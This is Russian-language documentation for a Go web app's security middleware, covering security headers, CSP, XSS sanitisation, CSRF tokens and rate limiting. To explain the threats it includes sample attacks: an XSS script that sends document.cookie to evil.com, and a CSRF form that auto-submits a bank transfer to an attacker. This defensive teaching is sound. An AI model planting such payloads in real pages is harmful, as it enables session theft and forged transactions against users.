# Security Middleware - Защита приложения

**Дата:** 14 декабря 2024

## Обзор

Security Middleware предоставляет защиту от различных веб-атак:
- **XSS** (Cross-Site Scripting) - внедрение вредоносного JavaScript
- **CSRF** (Cross-Site Request Forgery) - подделка запросов
- **Clickjacking** - встраивание страницы в iframe
- **MIME-type sniffing** - угадывание типа контента
- **Brute-force** - множественные попытки входа
- **DDoS** - перегрузка сервера запросами

## Security Headers

### X-Content-Type-Options: nosniff

**Что защищает:** MIME-type sniffing

**Как работает:**
Браузер не будет "угадывать" тип контента. Без этого заголовка браузер может интерпретировать текстовый файл как HTML, что может привести к XSS.

**Пример атаки:**
```
1. Злоумышленник загружает файл evil.txt с содержимым: <script>alert('XSS')</script>
2. Браузер "угадывает", что это HTML и выполняет скрипт
3. XSS атака успешна!
```

### X-Frame-Options: DENY

**Что защищает:** Clickjacking

**Как работает:**
Запрещает встраивание страницы в iframe на других сайтах.

**Пример атаки:**
```
1. Злоумышленник создаёт сайт evil.com
2. Встраивает ваш сайт в невидимый iframe
3. Накладывает невидимую кнопку поверх вашей кнопки "Удалить аккаунт"
4. Пользователь кликает, думая что кликает по другому элементу
5. Аккаунт удалён!
```

### X-XSS-Protection: 1; mode=block

**Что защищает:** XSS в старых браузерах

**Как работает:**
Включает встроенную защиту от XSS. В современных браузерах защита встроена, но для совместимости стоит оставить.

### Referrer-Policy: strict-origin-when-cross-origin

**Что защищает:** Утечка информации о структуре сайта

**Как работает:**
Контролирует, какую информацию о referrer отправлять:
- На тот же домен: полный URL
- На другой домен: только origin (домен)

### Content-Security-Policy (CSP)

**Что защищает:** XSS, data injection

**Как работает:**
Контролирует, откуда можно загружать ресурсы (JS, CSS, изображения).

**Политика:**
```
default-src 'self'        - по умолчанию только с того же домена
script-src 'self' 'unsafe-inline'  - скрипты с домена и inline
style-src 'self' 'unsafe-inline'  - стили с домена и inline
img-src 'self' data: https:       - изображения с домена, data: и https:
```

**ВАЖНО:** `'unsafe-inline'` нужен для работы jQuery/Bootstrap, но в идеале лучше использовать nonce.

## XSS Protection

### Что такое XSS?

**XSS (Cross-Site Scripting)** - это атака, когда злоумышленник внедряет вредоносный JavaScript код в страницу.

**Пример атаки:**
```html
<!-- Пользователь вводит в комментарий: -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>

<!-- Если выводится без санитизации, скрипт выполнится! -->
```

### Как защищает middleware

**XSSSanitizeMiddleware** удаляет все HTML теги из пользовательского ввода:

```go
// До санитизации
input := "<script>alert('XSS')</script>Hello"

// После санитизации
safe := middleware.SanitizeString(input)
// Результат: "Hello"
```

### Использование

```go
// В форме
r.POST("/api/users", middleware.XSSSanitizeMiddleware(), createUserHandler)

// Или вручную
safeInput := middleware.SanitizeString(userInput)
```

## CSRF Protection

### Что такое CSRF?

**CSRF (Cross-Site Request Forgery)** - это атака, когда злоумышленник заставляет жертву выполнить нежелательное действие на сайте, где жертва авторизована.

**Пример атаки:**
```
1. Пользователь авторизован на bank.com
2. Злоумышленник отправляет ссылку на evil.com
3. На evil.com есть форма:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="1000">
     <input name="to" value="attacker_account">
   </form>
   <script>document.forms[0].submit()</script>
4. Браузер автоматически отправляет cookies с bank.com
5. Запрос выполняется от имени пользователя!
```

### Как защищает middleware

**CSRFMiddleware** генерирует уникальный токен для каждой сессии и требует его во всех POST/PUT/DELETE запросах.

### Использование

```go
// В main.go
csrfMiddleware := middleware.CSRFMiddleware(
    config.Get().Security.CSRFSecret,
    "csrf_token",
    config.Get().Security.SessionCookieSecure,
)
r.Use(csrfMiddleware)
```

**В HTML формах:**
```html
<form method="POST">
    <input type="hidden" name="gorilla.csrf.Token" value="{{.csrf_token}}">
    <input type="text" name="username">
    <button type="submit">Submit</button>
</form>
```

**В AJAX запросах:**
```javascript
// Получить токен из заголовка
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/users', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': csrfToken,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
});
```

## Rate Limiting

### Что такое Rate Limiting?

**Rate Limiting** ограничивает количество запросов от одного IP адреса за период времени.

**Защищает от:**
- Брутфорс атак (множественные попытки входа)
- DDoS атак (перегрузка сервера)
- Злоупотребления API

### Использование

```go
// Для логина: 5 попыток в минуту
loginRateLimit := middleware.LoginRateLimitMiddleware()
auth.POST("/login", loginRateLimit, loginHandler)

// Для API: 100 запросов в секунду
apiRateLimit := middleware.APIRateLimitMiddleware()
api := r.Group("/api", apiRateLimit)

// Кастомный лимит
customLimit := middleware.RateLimitMiddleware("10", "1-M", "Too many requests")
r.POST("/endpoint", customLimit, handler)
```

### Формат лимитов

- `"5-M"` = 5 запросов в минуту
- `"100-S"` = 100 запросов в секунду
- `"1000-H"` = 1000 запросов в час
- `"10000-D"` = 10000 запросов в день

### Ответ при превышении лимита

```json
{
  "error": "Too many login attempts. Please try again later.",
  "message": "Rate limit exceeded. Please try again later."
}
```

HTTP статус: **429 Too Many Requests**

Заголовки:
- `X-RateLimit-Limit`: максимальный лимит
- `X-RateLimit-Remaining`: оставшиеся запросы
- `X-RateLimit-Reset`: время сброса лимита

## Конфигурация

Настройки в `config.yaml`:

```yaml
security:
  csrf_secret: "your-csrf-secret"
  rate_limit_login: 5    # Попыток входа в минуту
  rate_limit_api: 100    # API запросов в секунду
  session_cookie_secure: false  # true в продакшн с HTTPS
```

## Полный пример использования

```go
func main() {
    // ... инициализация ...
    
    r := gin.Default()
    
    // 1. Security Headers (первым!)
    r.Use(middleware.SecurityHeadersMiddleware())
    
    // 2. CSRF Protection
    csrfMiddleware := middleware.CSRFMiddleware(
        config.Get().Security.CSRFSecret,
        "csrf_token",
        config.Get().Security.SessionCookieSecure,
    )
    r.Use(csrfMiddleware)
    
    // 3. Auth
    r.Use(middleware.AuthMiddleware())
    
    // 4. Rate Limiting для логина
    auth := r.Group("/auth")
    auth.POST("/login", 
        middleware.LoginRateLimitMiddleware(),
        middleware.XSSSanitizeMiddleware(),
        loginHandler,
    )
    
    // 5. Rate Limiting для API
    api := r.Group("/api", middleware.APIRateLimitMiddleware())
    api.POST("/users", createUserHandler)
}
```

## Лучшие практики

### ✅ ДЕЛАТЬ:

1. **Всегда использовать Security Headers**
   ```go
   r.Use(middleware.SecurityHeadersMiddleware())
   ```

2. **CSRF для всех форм**
   ```go
   r.Use(middleware.CSRFMiddleware(...))
   ```

3. **Rate Limiting для критичных endpoints**
   ```go
   auth.POST("/login", middleware.LoginRateLimitMiddleware(), handler)
   ```

4. **Санитизировать пользовательский ввод**
   ```go
   safe := middleware.SanitizeString(userInput)
   ```

### ❌ НЕ ДЕЛАТЬ:

1. **Не отключать Security Headers в продакшн**
2. **Не использовать 'unsafe-inline' без необходимости**
3. **Не логировать CSRF токены**
4. **Не использовать слишком мягкие rate limits**

## Дополнительные ресурсы

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSRF Protection](https://owasp.org/www-community/attacks/csrf)

---

*Безопасность - это не опция, это необходимость!*

